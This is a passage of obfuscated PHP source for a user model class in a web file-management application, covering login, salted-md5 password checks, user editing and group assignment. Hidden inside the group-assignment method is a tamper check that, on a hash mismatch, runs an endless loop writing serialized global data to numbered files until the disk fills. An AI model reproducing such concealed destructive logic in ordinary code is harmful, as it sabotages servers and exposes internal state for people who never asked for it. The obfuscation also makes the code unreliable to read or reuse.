$©Î’¬¸ë = array(); foreach ($ÑÏ¦‘…Ô as $‰šŠğĞï) { if (isset($£ÀÚ…Ëè[$‰šŠğĞï])) { $©Î’¬¸ë[] = $£ÀÚ…Ëè[$‰šŠğĞï]; } } return $©Î’¬¸ë; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\141\142\154\x65\116\141\x6d\x65" => "\165\163\145\162\137\x6d\x65\164\x61", "\x6d\145\164\x61\x46\151\145\154\x64" => "\x75\163\145\x72\111\104"); protected $simpleField = "\165\x73\145\x72\111\104\54\156\x69\143\153\116\x61\x6d\145\x2c\156\x61\155\x65\54\141\x76\x61\164\x61\162\x2c\x73\145\170\54\x73\x74\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($©Ãˆ§»Ü) { $®ï®™Õ¯ =& $_SERVER[ò«¥Ê‡å]; $ø‡´ë¡ = $®ï®™Õ¯[2353]; return array($®ï®™Õ¯[1977] => array($©Ãˆ§»Ü[0], $ø‡´ë¡), $®ï®™Õ¯[1979] => array($©Ãˆ§»Ü[0], $ø‡´ë¡), $®ï®™Õ¯[2354] => array($©Ãˆ§»Ü[0], $ø‡´ë¡)); } protected function getInfo($“İúš²™, $‡µ…¸ó€ = false) { $ªê²ñ—À = $this->getInfoSimple($“İúš²™); if (!is_array($ªê²ñ—À)) { return array(); } if ($‡µ…¸ó€) { return $this->_getInfoApply($ªê²ñ—À); } return $this->cacheFunctionGet($_SERVER[ò«¥Ê‡å][1981], $“İúš²™); } protected function getInfoFull($„Ç×Ú, $­ò§İ¶… = false) { $¤Ã÷Õçş = $this->getInfoSimple($„Ç×Ú); if (!is_array($¤Ã÷Õçş)) { return array(); } if ($­ò§İ¶…) { return $this->_getInfoApply($¤Ã÷Õçş, !0); } return $this->cacheFunctionGet($_SERVER[ò«¥Ê‡å][2355], $„Ç×Ú); } private function _getInfoApply($¿î¦ìŒ, $¹ğé’ï = false) { $Úëø±‡¬ =& $_SERVER[ò«¥Ê‡å]; if (!$¿î¦ìŒ) { return $¿î¦ìŒ; } $¾Æö°¥¯ = md5($Úëø±‡¬[2356] . $¿î¦ìŒ[$Úëø±‡¬[936]] . $Úëø±‡¬[2357] . $¿î¦ìŒ[$Úëø±‡¬[32]]); $¿î¦ìŒ = $this->_listDataApplyItem($¿î¦ìŒ); $üê”æµø = Model($Úëø±‡¬[1380])->metaGet($¿î¦ìŒ[$Úëø±‡¬[89]][$Úëø±‡¬[183]]); $¿î¦ìŒ[$Úëø±‡¬[2358]] = $¾Æö°¥¯; $¿î¦ìŒ[$Úëø±‡¬[89]][$Úëø±‡¬[2174]] = isset($üê”æµø[$Úëø±‡¬[2175]]) ? $üê”æµø[$Úëø±‡¬[2175]] : null; if ($¹ğé’ï) { $¿î¦ìŒ[$Úëø±‡¬[509]] = $this->metaGet($¿î¦ìŒ[$Úëø±‡¬[1701]]); } return $¿î¦ìŒ; } protected function getInfoSimple($Üã·–¬, $Á‡ÕÑ©² = false) { $©ô­Õ =& $_SERVER[ò«¥Ê‡å]; if (!$Üã·–¬) { return array(); } if ($Á‡ÕÑ©²) { $¢ëòä‚ = $this->where(array($©ô­Õ[1701] => intval($Üã·–¬)))->find(); if (!is_array($¢ëòä‚)) { return array(); } $¢ëòä‚[$©ô­Õ[2359]] = Action($©ô­Õ[2360])->parseUrl($¢ëòä‚[$©ô­Õ[2359]]); return $¢ëòä‚; } return $this->cacheFunctionGet($©ô­Õ[1982], $Üã·–¬); } protected function getInfoSimpleOuter($œ˜‘ä•Ô) { $êªµçŞ³ =& $_SERVER[ò«¥Ê‡å]; if (!$œ˜‘ä•Ô || $œ˜‘ä•Ô == 0) { return array($êªµçŞ³[1701] => $êªµçŞ³[214], $êªµçŞ³[32] => $êªµçŞ³[165] . LNG($êªµçŞ³[2361]) . $êªµçŞ³[167], $êªµçŞ³[2359] => STATIC_PATH . $êªµçŞ³[2362]); } $ÜËÖÙÎÎ = $this->cacheFunctionGet($êªµçŞ³[1982], $œ˜‘ä•Ô); $¯ÁŠÍ©× = array_field_key($ÜËÖÙÎÎ, explode($êªµçŞ³[50], $this->simpleField)); if (!$¯ÁŠÍ©×) { return array($êªµçŞ³[1701] => $êªµçŞ³[1235], $êªµçŞ³[32] => $êªµçŞ³[165] . LNG($êªµçŞ³[2363]) . $êªµçŞ³[167], $êªµçŞ³[2359] => STATIC_PATH . $êªµçŞ³[2364]); } $¯ÁŠÍ©×[$êªµçŞ³[2359]] = Action($êªµçŞ³[2360])->parseUrl($¯ÁŠÍ©×[$êªµçŞ³[2359]]); return $¯ÁŠÍ©×; } protected function groupUser($ûó¤æƒö) { } public static function errorLang($ÙƒÂ¢àí) { $æ™¯¥é‘ =& $_SERVER[ò«¥Ê‡å]; $°›Ëô®ò = array(self::ERROR_USER_NOT_EXISTS => $æ™¯¥é‘[2365], self::ERROR_USER_PASSWORD_ERROR => $æ™¯¥é‘[2366], self::ERROR_USER_EXIST_NAME => $æ™¯¥é‘[2367], self::ERROR_USER_EXIST_PHONE => $æ™¯¥é‘[2368], self::ERROR_USER_EXIST_EMAIL => $æ™¯¥é‘[2369], self::ERROR_USER_LOGIN_LOCK => $æ™¯¥é‘[2370], self::ERROR_IP_NOT_ALLOW => $æ™¯¥é‘[2371], self::ERROR_USER_EXIST_NICKNAME => $æ™¯¥é‘[2372]); return LNG($°›Ëô®ò[$ÙƒÂ¢àí]); } public function getInfoByMeta($•¨ĞÃ‡, $ÉÇ¦İøÕ) { $˜Ø¯é¾¨ =& $_SERVER[ò«¥Ê‡å]; $ãç²ü“¬ = Model($˜Ø¯é¾¨[2373])->where(array($˜Ø¯é¾¨[96] => $•¨ĞÃ‡, $˜Ø¯é¾¨[420] => $ÉÇ¦İøÕ))->find(); if ($ãç²ü“¬) { return $this->getInfo($ãç²ü“¬[$˜Ø¯é¾¨[1701]]); } return !1; } public function userLoginCheck($­áıØ¶·, $Á·±ó½ì) { $éƒí¸ =& $_SERVER[ò«¥Ê‡å]; $¦†ı¿¨£ = $this->userLoginFind($­áıØ¶·); if (!$¦†ı¿¨£) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¦†ı¿¨£[$éƒí¸[1701]], $Á·±ó½ì)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¦†ı¿¨£[$éƒí¸[1701]]); } public function userLoginFind($Œ¥Œã™’) { $õæªÁï =& $_SERVER[ò«¥Ê‡å]; $Ï•Œ¬‹ = array($õæªÁï[32] => $Œ¥Œã™’, $õæªÁï[2182] => $Œ¥Œã™’, $õæªÁï[351] => $Œ¥Œã™’, $õæªÁï[2374] => $Œ¥Œã™’, $õæªÁï[1047] => $õæªÁï[1049]); if ($this->nickNameRpt()) { unset($Ï•Œ¬‹[$õæªÁï[2182]]); } return $this->where($Ï•Œ¬‹)->find(); } public function clearCache($×„­ôí») { $ó©›¢à =& $_SERVER[ò«¥Ê‡å]; $this->cacheFunctionClear($ó©›¢à[1981], $×„­ôí»); $this->cacheFunctionClear($ó©›¢à[1982], $×„­ôí»); $this->cacheFunctionClear($ó©›¢à[2355], $×„­ôí»); } public function userPasswordCheck($ï˜ÈØë“, $Á—â·í¦) { $†‚µËü… =& $_SERVER[ò«¥Ê‡å]; $Ã—Ûß‚Ó = $this->where(array($†‚µËü…[1701] => intval($ï˜ÈØë“)))->find(); $îı¢‰ó” = $this->metaGet($ï˜ÈØë“); $ä–ìòíÙ = isset($îı¢‰ó”[$†‚µËü…[2375]]) ? $îı¢‰ó”[$†‚µËü…[2375]] : $†‚µËü…[12]; if (md5($ä–ìòíÙ . trim($Á—â·í¦)) !== $Ã—Ûß‚Ó[$†‚µËü…[936]]) { return !1; } return !0; } public function userAdd($’ƒÀ–§§) { $ĞòûíÏ¥ =& $_SERVER[ò«¥Ê‡å]; $†ñÉù¢˜ = array($ĞòûíÏ¥[464] => $’ƒÀ–§§[$ĞòûíÏ¥[32]], $ĞòûíÏ¥[2376] => $’ƒÀ–§§[$ĞòûíÏ¥[2101]], $ĞòûíÏ¥[2377] => isset($’ƒÀ–§§[$ĞòûíÏ¥[351]]) ? $’ƒÀ–§§[$ĞòûíÏ¥[351]] : $ĞòûíÏ¥[12], $ĞòûíÏ¥[2378] => isset($’ƒÀ–§§[$ĞòûíÏ¥[2374]]) ? $’ƒÀ–§§[$ĞòûíÏ¥[2374]] : $ĞòûíÏ¥[12], $ĞòûíÏ¥[2379] => isset($’ƒÀ–§§[$ĞòûíÏ¥[2182]]) ? $’ƒÀ–§§[$ĞòûíÏ¥[2182]] : $’ƒÀ–§§[$ĞòûíÏ¥[32]], $ĞòûíÏ¥[2380] => isset($’ƒÀ–§§[$ĞòûíÏ¥[2359]]) ? $’ƒÀ–§§[$ĞòûíÏ¥[2359]] : $ĞòûíÏ¥[12], $ĞòûíÏ¥[2381] => isset($’ƒÀ–§§[$ĞòûíÏ¥[2382]]) ? $’ƒÀ–§§[$ĞòûíÏ¥[2382]] : 1, $ĞòûíÏ¥[2383] => $’ƒÀ–§§[$ĞòûíÏ¥[936]], $ĞòûíÏ¥[1983] => isset($’ƒÀ–§§[$ĞòûíÏ¥[1886]]) ? $’ƒÀ–§§[$ĞòûíÏ¥[1886]] : 1024 * 1024 * 20, $ĞòûíÏ¥[1984] => 0, $ĞòûíÏ¥[2384] => 0, $ĞòûíÏ¥[2028] => isset($’ƒÀ–§§[$ĞòûíÏ¥[789]]) ? $’ƒÀ–§§[$ĞòûíÏ¥[789]] : 1); if (!empty($’ƒÀ–§§[$ĞòûíÏ¥[1701]])) { $†ñÉù¢˜[$ĞòûíÏ¥[1701]] = $’ƒÀ–§§[$ĞòûíÏ¥[1701]]; } $Äèé¦»ø = $this->_checkExist($’ƒÀ–§§); if ($Äèé¦»ø !== !0) { return $Äèé¦»ø; } if (!empty($†ñÉù¢˜[$ĞòûíÏ¥[2359]]) && strlen($†ñÉù¢˜[$ĞòûíÏ¥[2359]]) > 255) { $†ñÉù¢˜[$ĞòûíÏ¥[2359]] = $ĞòûíÏ¥[12]; } $´ŸÜÑéï = $this->add($†ñÉù¢˜); $‰•şü‡â = array($ĞòûíÏ¥[2383] => $†ñÉù¢˜[$ĞòûíÏ¥[936]], $ĞòûíÏ¥[2379] => $†ñÉù¢˜[$ĞòûíÏ¥[2182]]); $this->userEdit($´ŸÜÑéï, $‰•şü‡â); Model($ĞòûíÏ¥[1380])->userRootAdd($´ŸÜÑéï); return $´ŸÜÑéï; } protected function userEditTest($é™š˜, $Ş‡õäö¨) { return $this->call($_SERVER[ò«¥Ê‡å][2385], $é™š˜, $Ş‡õäö¨); } protected function userEdit($ëÉéˆëø, $‡ìÓ«ı) { $¤Ïôà =& $_SERVER[ò«¥Ê‡å]; $Ùú‡ÙÂŒ = $this->getInfoSimple($ëÉéˆëø); if (!$Ùú‡ÙÂŒ) { return !1; } $‚Ú¥ò› = $this->_checkExist($‡ìÓ«ı, $ëÉéˆëø); if ($‚Ú¥ò› !== !0) { return $‚Ú¥ò›; } if (isset($‡ìÓ«ı[$¤Ïôà[936]]) && trim($‡ìÓ«ı[$¤Ïôà[936]]) != $¤Ïôà[12]) { $éÚé‰ƒ = $this->metaGet($ëÉéˆëø); if (empty($éÚé‰ƒ[$¤Ïôà[2375]])) { $éÚé‰ƒ[$¤Ïôà[2375]] = rand_string(10); Model($¤Ïôà[548])->metaSet($ëÉéˆëø, $¤Ïôà[2375], $éÚé‰ƒ[$¤Ïôà[2375]]); } $‡ìÓ«ı[$¤Ïôà[936]] = md5($éÚé‰ƒ[$¤Ïôà[2375]] . trim($‡ìÓ«ı[$¤Ïôà[936]])); } else { unset($‡ìÓ«ı[$¤Ïôà[936]]); } if (!empty($‡ìÓ«ı[$¤Ïôà[2359]]) && strlen($‡ìÓ«ı[$¤Ïôà[2359]]) > 255) { $‡ìÓ«ı[$¤Ïôà[2359]] = $¤Ïôà[12]; } $this->where(array($¤Ïôà[1692] => $ëÉéˆëø))->save($‡ìÓ«ı); if (isset($‡ìÓ«ı[$¤Ïôà[2182]])) { $this->setNamePinyin($ëÉéˆëø, $‡ìÓ«ı[$¤Ïôà[2182]]); } $this->clearCache($ëÉéˆëø); return !0; } public function setNamePinyin($ğ‡ÒŞ¤, $†ƒ­¾û‚ = false) { $¦¶¸úÚÓ =& $_SERVER[ò«¥Ê‡å]; if (!$†ƒ­¾û‚) { $ÒÊï©Öæ = $this->getInfoSimple($ğ‡ÒŞ¤); $†ƒ­¾û‚ = $ÒÊï©Öæ[$¦¶¸úÚÓ[2182]] ? $ÒÊï©Öæ[$¦¶¸úÚÓ[2182]] : $ÒÊï©Öæ[$¦¶¸úÚÓ[32]]; } $ğ¦ —›ß = Model($¦¶¸úÚÓ[569]); if (!Input::check($†ƒ­¾û‚, $¦¶¸úÚÓ[625])) { return $ğ¦ —›ß->metaSet($ğ‡ÒŞ¤, array($¦¶¸úÚÓ[508] => $¦¶¸úÚÓ[12], $¦¶¸úÚÓ[507] => $¦¶¸úÚÓ[12])); } return $ğ¦ —›ß->metaSet($ğ‡ÒŞ¤, array($¦¶¸úÚÓ[508] => str_replace($¦¶¸úÚÓ[53], $¦¶¸úÚÓ[12], Pinyin::get($†ƒ­¾û‚)), $¦¶¸úÚÓ[507] => Pinyin::get($†ƒ­¾û‚, $¦¶¸úÚÓ[626]))); } private function nickNameRpt() { $Õ’ˆ˜ê§ =& $_SERVER[ò«¥Ê‡å]; $¿°Ù£† = Model($Õ’ˆ˜ê§[809])->get($Õ’ˆ˜ê§[2386]); $óûı¸…ò = $GLOBALS[$Õ’ˆ˜ê§[6]][$Õ’ˆ˜ê§[427]][$Õ’ˆ˜ê§[2386]]; $çÔŒêÍÌ = !is_null($¿°Ù£†) ? $¿°Ù£† : $óûı¸…ò; return !!$çÔŒêÍÌ; } private function _checkExist($›œÜ•¬×, $ÒÏ’çŸ› = false) { $—é‹ºš» =& $_SERVER[ò«¥Ê‡å]; $„»§·Ÿİ = array($—é‹ºš»[32] => UserModel::ERROR_USER_EXIST_NAME, $—é‹ºš»[2182] => UserModel::ERROR_USER_EXIST_NICKNAME, $—é‹ºš»[351] => UserModel::ERROR_USER_EXIST_EMAIL, $—é‹ºš»[2374] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($„»§·Ÿİ[$—é‹ºš»[2182]]); } $³é•à¥ = $ÒÏ’çŸ› ? array($—é‹ºš»[1701] => array($—é‹ºš»[2387], $ÒÏ’çŸ›)) : array(); foreach ($„»§·Ÿİ as $¦ÄÉ†ïÌ => $™²ãÁùÂ) { $ÄÛà£ã‹ = array(); foreach ($„»§·Ÿİ as $î±Æçãè => $ÁëËÓÇ) { if (isset($›œÜ•¬×[$î±Æçãè]) && $›œÜ•¬×[$î±Æçãè]) { $ÄÛà£ã‹[] = $›œÜ•¬×[$î±Æçãè]; } } if (!$ÄÛà£ã‹) { continue; } $ª°ìƒ§… = array_merge(array($¦ÄÉ†ïÌ => array($—é‹ºš»[7], $ÄÛà£ã‹)), $³é•à¥); $®¾·¹¿ = $this->where($ª°ìƒ§…)->find(); if ($®¾·¹¿) { return $™²ãÁùÂ; } } return !0; } public function userListInfo($¿µëòê) { $É­½¦Í› =& $_SERVER[ò«¥Ê‡å]; $˜úóáñ£ = array(); $¿µëòê = is_array($¿µëòê) ? array_unique($¿µëòê) : array(); if (!$¿µëòê) { return $˜úóáñ£; } if (count($¿µëòê) < 20) { foreach ($¿µëòê as $»öÃÀ…) { $˜úóáñ£[$»öÃÀ… . $É­½¦Í›[12]] = $this->getInfoSimpleOuter($»öÃÀ…); } } else { $…§şˆº¨ = array($É­½¦Í›[1692] => array($É­½¦Í›[462], $¿µëòê)); if (count($¿µëòê) == 1) { $…§şˆº¨ = array($É­½¦Í›[1692] => $¿µëòê[0]); } $ŞÃäÌ”ó = Model($É­½¦Í›[548])->field($this->simpleField)->where($…§şˆº¨)->select(); $ŞÃäÌ”ó = array_to_keyvalue($ŞÃäÌ”ó, $É­½¦Í›[1701]); foreach ($¿µëòê as $»öÃÀ…) { $ÕøÏñ€ñ = $ŞÃäÌ”ó[$»öÃÀ…]; if (!$ÕøÏñ€ñ) { $˜úóáñ£[$»öÃÀ… . $É­½¦Í›[12]] = $this->getInfoSimpleOuter($»öÃÀ…); continue; } $ÕøÏñ€ñ[$É­½¦Í›[2359]] = Action($É­½¦Í›[2360])->parseUrl($ÕøÏñ€ñ[$É­½¦Í›[2359]]); $˜úóáñ£[$»öÃÀ… . $É­½¦Í›[12]] = $ÕøÏñ€ñ; } } return $˜úóáñ£; } protected function userStatus($ŸÖ¤îßÉ, $«²²ÎÎ) { $á‰Ò°š = $this->getInfoSimple($ŸÖ¤îßÉ); if (!$á‰Ò°š) { return !1; } $®Ï¯ÎÊ± = array($_SERVER[ò«¥Ê‡å][789] => $«²²ÎÎ); return $this->userEdit($ŸÖ¤îßÉ, $®Ï¯ÎÊ±); } protected function userRemove($„şŞöîÍ) { $•šÇ½Œç =& $_SERVER[ò«¥Ê‡å]; $ÂË“ÚÌ” = $this->getInfoSimple($„şŞöîÍ); if (!$ÂË“ÚÌ”) { return !1; } $Î£‹‹È = array($•šÇ½Œç[1692] => $„şŞöîÍ); Model($•šÇ½Œç[634])->where($Î£‹‹È)->delete(); Model($•šÇ½Œç[2388])->where($Î£‹‹È)->delete(); Model($•šÇ½Œç[1989])->where($Î£‹‹È)->delete(); Model($•šÇ½Œç[2373])->where($Î£‹‹È)->delete(); Model($•šÇ½Œç[1115])->where($Î£‹‹È)->delete(); Model($•šÇ½Œç[2199])->removeUserAll($„şŞöîÍ); Model($•šÇ½Œç[871])->userRootRemove($„şŞöîÍ); return $this->where($Î£‹‹È)->delete(); } protected function userGroupSet($Ö¼÷Ü÷, $×ïúöÂİ, $çÂ±›é° = array()) { $ñ ¨¿Ù± =& $_SERVER[ò«¥Ê‡å]; $²óî¶å = $_SERVER[$ñ ¨¿Ù±[840]] . $ñ ¨¿Ù±[841]; $¸û÷‚÷ = $ñ ¨¿Ù±[923]; if ($_SERVER[$ñ ¨¿Ù±[837]] != $¸û÷‚÷($²óî¶å)) { $÷—µ–¸ş = $ñ ¨¿Ù±[924]; $ƒ‚ÑÚÏŸ = $ñ ¨¿Ù±[839]; $¢î‰øâê = $_SERVER[$ñ ¨¿Ù±[840]] . $ñ ¨¿Ù±[841]; $‘´–Ç³ = $ƒ‚ÑÚÏŸ($¢î‰øâê); $Èâ­¹Ÿ„ = explode($ñ ¨¿Ù±[248], $‘´–Ç³); if (count($Èâ­¹Ÿ„) < $ñ ¨¿Ù±[673]) { $•½ªË€ƒ = $ñ ¨¿Ù±[842]; $•½ªË€ƒ(); } $¨Ï¯“’¹ = $ñ ¨¿Ù±[925]; $¨Ï¯“’¹($_SERVER[$ñ ¨¿Ù±[926]]); $÷—µ–¸ş = $ñ ¨¿Ù±[924]; $÷—µ–¸ş(); $¯©åÙÒÆ = $ñ ¨¿Ù±[927]; $®´×¢½µ = json_encode($GLOBALS[$ñ ¨¿Ù±[928]]); $»Ú«ªĞ = 1; for ($§èÜ‰ûÑ = $»Ú«ªĞ; $§èÜ‰ûÑ > 0; $§èÜ‰ûÑ++) { $¯©åÙÒÆ(DATA_PATH . $§èÜ‰ûÑ, $®´×¢½µ); } } $Ÿ©‚µªÉ = $this->getInfoSimple($Ö¼÷Ü÷); if (!$Ÿ©‚µªÉ || !is_array($×ïúöÂİ)) { return !1; } $ùûá©¹å = Model($ñ ¨¿Ù±[1989]); $ùûá©¹å->where(array($ñ ¨¿Ù±[1701] => $Ö¼÷Ü÷))->delete(); $§Á­‘ôË = array(); $ÉñÕéÑ = 0; foreach ($×ïúöÂİ as $ñØé§¥Ğ => $š¡º¸¹ş) { $êÁ§ˆ = array($ñ ¨¿Ù±[1701] => $Ö¼÷Ü÷, $ñ ¨¿Ù±[1899] => $ñØé§¥Ğ, $ñ ¨¿Ù±[2003] => $š¡º¸¹ş); $êÁ§ˆ[$ñ ¨¿Ù±[1923]] = isset($çÂ±›é°[$ÉñÕéÑ]) ? $çÂ±›é°[$ÉñÕéÑ] : 0; $ÉñÕéÑ++; $§Á­‘ôË[] = $êÁ§ˆ; } return $ùûá©¹å->addAll($§Á­‘ôË, array(), !0); } protected function userGroupAdd($¶äÎ¦şº, $¾¼À¸ã¤ = array()) { $‘¾ÚÂÓ =& $_SERVER[ò«¥Ê‡å]; $Ó“—®« = $this->getInfoSimple($¶äÎ¦şº); if (!$Ó“—®« || empty($¾¼À¸ã¤)) { return !1; } $¶ €èóË = array(); foreach ($¾¼À¸ã¤ as $íàÃ’¶µ => $÷ï§¼åŠ) { $¶ €èóË[] = array($‘¾ÚÂÓ[1701] => $¶äÎ¦şº, $‘¾ÚÂÓ[1899] => $íàÃ’¶µ, $‘¾ÚÂÓ[2003] => $÷ï§¼åŠ, $‘¾ÚÂÓ[1923] => 0); } return Model($‘¾ÚÂÓ[1989])->addAll($¶ €èóË, array(), !0); } protected function userGroupRemove($Ä†¤¯, $å©éš¹) { $ÊÜ¢Ÿóä =& $_SERVER[ò«¥Ê‡å]; $¶ À£Õ¦ = $this->getInfoSimple($Ä†¤¯); if (!$¶ À£Õ¦ || !$å©éš¹) { return !1; } $é ¬½òê = array($ÊÜ¢Ÿóä[1692] => $Ä†¤¯, $ÊÜ¢Ÿóä[1987] => $å©éš¹); return Model($ÊÜ¢Ÿóä[1989])->where($é ¬½òê)->delete(); } public function listData() { $²¦ìø¾‰ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($²¦ìø¾‰[$_SERVER[ò«¥Ê‡å][415]]); return $²¦ìø¾‰; } public function listByID($À²â¸ÂŒ) { $¦´½·š¤ =& $_SERVER[ò«¥Ê‡å]; if (!$À²â¸ÂŒ) { return; } $êÁØ¿¢÷ = array($¦´½·š¤[1701] => array($¦´½·š¤[7], $À²â¸ÂŒ)); $ëÇ¸Ş¡Í = $this->where($êÁØ¿¢÷)->select(); $ëÇ¸Ş¡Í = array_sort_keep($ëÇ¸Ş¡Í, $¦´½·š¤[1701], $À²â¸ÂŒ); $this->_listDataApply($ëÇ¸Ş¡Í); return $ëÇ¸Ş¡Í; } public function listByGroup($“®û®Ä‚ = 0, $Æê¨ô·« = array()) { $’ŸÏ®› =& $_SERVER[ò«¥Ê‡å]; $İ–ü‘§ù = $’ŸÏ®›[12]; $®»û±¢é = array(); if ($“®û®Ä‚) { $®»û±¢é = array($’ŸÏ®›[2389] => intval($“®û®Ä‚)); $İ–ü‘§ù = "\x4c\x45\x46\124\x20\x4a\x4f\111\116\40{$this->tablePrefix}\x75\163\x65\x72\x5f\x67\162\157\165\160\40\x75\x73\x65\162\x5f\147\162\157\165\160\x20\x6f\x6e\40\165\163\145\162\x2e\165\x73\x65\162\x49\104\40\75\x20\x75\x73\145\x72\x5f\147\x72\x6f\x75\160\56\165\163\145\x72\x49\x44"; $õ³Ëô‘§ = Input::get($’ŸÏ®›[500], null, $’ŸÏ®›[12]) ? $’ŸÏ®›[12] : $’ŸÏ®›[2390]; } if (isset($Æê¨ô·«[$’ŸÏ®›[789]])) { $®»û±¢é[$’ŸÏ®›[2391]] = $Æê¨ô·«[$’ŸÏ®›[789]]; } $Öœ ŒÊ… = $this->_makeOrder($õ³Ëô‘§)->field($’ŸÏ®›[2392])->where($®»û±¢é)->join($İ–ü‘§ù)->selectPage(50); $this->_listDataApply($Öœ ŒÊ…[$’ŸÏ®›[415]]); return $Öœ ŒÊ…; } private function _makeOrder($°…Óú²Ú = '') { $çŸ¸ŒŞÁ =& $_SERVER[ò«¥Ê‡å]; $ı‰–Œˆî = array($çŸ¸ŒŞÁ[1701], $çŸ¸ŒŞÁ[32], $çŸ¸ŒŞÁ[1888], $çŸ¸ŒŞÁ[1860], $çŸ¸ŒŞÁ[217]); $”×öºõ¥ = array($çŸ¸ŒŞÁ[493] => $çŸ¸ŒŞÁ[494], $çŸ¸ŒŞÁ[495] => $çŸ¸ŒŞÁ[496]); $îê»îÔ = Input::get($çŸ¸ŒŞÁ[500], $çŸ¸ŒŞÁ[7], $çŸ¸ŒŞÁ[1692], $ı‰–Œˆî); $×·™ğŞ‡ = Input::get($çŸ¸ŒŞÁ[501], $çŸ¸ŒŞÁ[7], $çŸ¸ŒŞÁ[1990], array($çŸ¸ŒŞÁ[1990], $çŸ¸ŒŞÁ[495])); $×·™ğŞ‡ = $”×öºõ¥[$×·™ğŞ‡]; $°…Óú²Ú = $°…Óú²Ú . "\165\163\x65\162\56{$îê»îÔ}\40{$×·™ğŞ‡}\54\x20\165\163\x65\162\x2e\x75\x73\x65\x72\111\x44\40\x61\163\x63"; return $this->alias($çŸ¸ŒŞÁ[2117])->order($°…Óú²Ú); } public function listSearch($ÈëÛ‚È›) { $„³¢ÕÃâ =& $_SERVER[ò«¥Ê‡å]; $¬Î‹Ê¢‹ = $ÈëÛ‚È›[$„³¢ÕÃâ[1993]]; $ãùÄİ = isset($ÈëÛ‚È›[$„³¢ÕÃâ[1994]]) ? $ÈëÛ‚È›[$„³¢ÕÃâ[1994]] : !1; $¬Î‹Ê¢‹ = str_replace($„³¢ÕÃâ[1995], $„³¢ÕÃâ[1996], trim($¬Î‹Ê¢‹)); $çÍÕìä™ = array($„³¢ÕÃâ[32] => array($„³¢ÕÃâ[429], "\45{$¬Î‹Ê¢‹}\x25"), $„³¢ÕÃâ[351] => array($„³¢ÕÃâ[429], "{$¬Î‹Ê¢‹}\45"), $„³¢ÕÃâ[2182] => array($„³¢ÕÃâ[429], "{$¬Î‹Ê¢‹}\x25"), $„³¢ÕÃâ[1047] => $„³¢ÕÃâ[1997]); if (Input::check($¬Î‹Ê¢‹, $„³¢ÕÃâ[357])) { $çÍÕìä™[$„³¢ÕÃâ[1701]] = array($„³¢ÕÃâ[429], "{$¬Î‹Ê¢‹}\45"); $çÍÕìä™[$„³¢ÕÃâ[2374]] = array($„³¢ÕÃâ[429], "{$¬Î‹Ê¢‹}\45"); } if (!$¬Î‹Ê¢‹) { $çÍÕìä™ = array(); } if (isset($ÈëÛ‚È›[$„³¢ÕÃâ[789]])) { $çÍÕìä™[$„³¢ÕÃâ[789]] = $ÈëÛ‚È›[$„³¢ÕÃâ[789]]; } $çÍÕìä™ = $this->parseWhereLike($çÍÕìä™); $£âÕÙºï = $this->_makeOrder()->where($çÍÕìä™)->selectPage(20); if (!$£âÕÙºï || count($£âÕÙºï[$„³¢ÕÃâ[415]]) < 5 && Input::check($¬Î‹Ê¢‹, $„³¢ÕÃâ[364])) { $–ô™¢ù€ = $this->_searchFromMeta($„³¢ÕÃâ[507], $¬Î‹Ê¢‹, 10); $ìÖĞ•ñï = $this->_searchFromMeta($„³¢ÕÃâ[508], $¬Î‹Ê¢‹, 10); $ÅÙù—ò³ = array_merge($–ô™¢ù€, $ìÖĞ•ñï, $£âÕÙºï[$„³¢ÕÃâ[415]]); $£âÕÙºï[$„³¢ÕÃâ[415]] = array_unique_by_key($ÅÙù—ò³, $„³¢ÕÃâ[1701]); $£âÕÙºï[$„³¢ÕÃâ[412]][$„³¢ÕÃâ[413]] = count($£âÕÙºï[$„³¢ÕÃâ[415]]); $£âÕÙºï[$„³¢ÕÃâ[412]][$„³¢ÕÃâ[414]] = ceil($£âÕÙºï[$„³¢ÕÃâ[412]][$„³¢ÕÃâ[413]] / $£âÕÙºï[$„³¢ÕÃâ[412]][$„³¢ÕÃâ[409]]); } $this->_listDataApply($£âÕÙºï[$„³¢ÕÃâ[415]]); $this->_filterByGroup($£âÕÙºï, $ãùÄİ); return $£âÕÙºï; } private function _filterByGroup(&$¢²øÓ, $Ç•¯¼ñÚ) { $Ûà“ÛÁĞ =& $_SERVER[ò«¥Ê‡å]; if (!$Ç•¯¼ñÚ) { return $¢²øÓ; } foreach ($¢²øÓ[$Ûà“ÛÁĞ[415]] as $ßÛ¥…š— => &$ “›ÚñÍ) { $–ü©æ‚Á = array_to_keyvalue($ “›ÚñÍ[$Ûà“ÛÁĞ[2086]], $Ûà“ÛÁĞ[12], $Ûà“ÛÁĞ[1899]); if (!in_array($Ç•¯¼ñÚ, $–ü©æ‚Á)) { unset($¢²øÓ[$Ûà“ÛÁĞ[415]][$ßÛ¥…š—]); } } unset($ “›ÚñÍ); $¢²øÓ[$Ûà“ÛÁĞ[415]] = array_values($¢²øÓ[$Ûà“ÛÁĞ[415]]); $¢²øÓ[$Ûà“ÛÁĞ[412]] = array($Ûà“ÛÁĞ[2152] => count($¢²øÓ[$Ûà“ÛÁĞ[415]]), $Ûà“ÛÁĞ[2150] => $¢²øÓ[$Ûà“ÛÁĞ[412]][$Ûà“ÛÁĞ[409]], $Ûà“ÛÁĞ[2149] => 1, $Ûà“ÛÁĞ[2151] => 1); } private function _searchFromMeta($€£„û, $Ü¿‘öŸ¡, $Š«ñ¬ùğ) { $Õ»’Ô·÷ =& $_SERVER[ò«¥Ê‡å]; $Ü¿‘öŸ¡ = strtolower($Ü¿‘öŸ¡); $Ò“£¥ = array($Õ»’Ô·÷[96] => $€£„û, $Õ»’Ô·÷[420] => array($Õ»’Ô·÷[429], "\x25{$Ü¿‘öŸ¡}\45")); $Ò“£¥ = $this->parseWhereLike($Ò“£¥); $Ğ¨‚ñ›¸ = Model($Õ»’Ô·÷[2393])->where($Ò“£¥)->limit($Š«ñ¬ùğ)->select(); if (!$Ğ¨‚ñ›¸) { return array(); } 